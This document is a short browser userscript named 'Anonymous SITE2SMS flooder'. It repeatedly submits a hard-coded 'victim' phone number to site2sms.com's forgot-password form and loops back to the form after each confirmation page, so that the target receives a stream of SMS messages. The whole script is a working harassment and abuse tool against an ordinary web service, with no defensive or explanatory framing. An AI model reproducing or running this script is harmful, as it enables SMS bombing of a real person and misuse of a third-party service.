// ==UserScript==>
// @name          Anonymous SITE2SMS flooder
// @namespace     SUNNY020
// @description   flooder sms
// @include       http://*site2sms.com/*
// @credits       One
// ==/UserScript==

var victim=9031990660 //
var delay=0; // Enter delay in milliseconds if required

if(document.location=="http://www.site2sms.com/ForgotPassword.asp"||document.location=="http://www.site2sms.com/ForgotPassword.asp")
{
document.getElementById('txtMobileNo').value=victim;
document.forms[0].submit();
}
if(document.location=="http://www.site2sms.com/ForgotPassword.asp?errmsg=Password%20Will%20Be%20Sent%20To%20Your%20Mobile%20No%20Within%201-2%20Minutes!!"||document.location=="http://www.site2sms.com/ForgotPassword.asp?errmsg=Password%20Will%20Be%20Sent%20To%20Your%20Mobile%20No%20Within%201-2%20Minutes!!")
setTimeout("document.location='http://www.site2sms.com/ForgotPassword.asp'",delay);
